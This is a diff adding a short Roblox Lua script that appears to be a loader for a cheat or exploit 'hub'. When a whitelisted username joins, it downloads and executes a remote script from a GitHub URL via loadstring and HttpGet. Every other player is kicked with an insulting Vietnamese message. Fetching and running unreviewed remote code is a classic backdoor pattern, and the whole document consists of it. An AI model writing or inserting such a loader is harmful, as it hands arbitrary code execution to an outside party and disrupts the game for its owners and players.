@@ -1,0 +1,13 @@
+local usernames= {
+    "ibsbdhd877"
+}
+ 
+game.Players.PlayerAdded:Connect(function(plr)
+    for i, v in pairs(usernames) do
+        if v == plr.Name then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Gamer144roblox/Pro-hub-/main/Best%20Hub%20Verison%204.0"))()
+        else
+            plr:Kick("Maru Hub:Cút") -- Kick message.
+        end
+    end
+end)
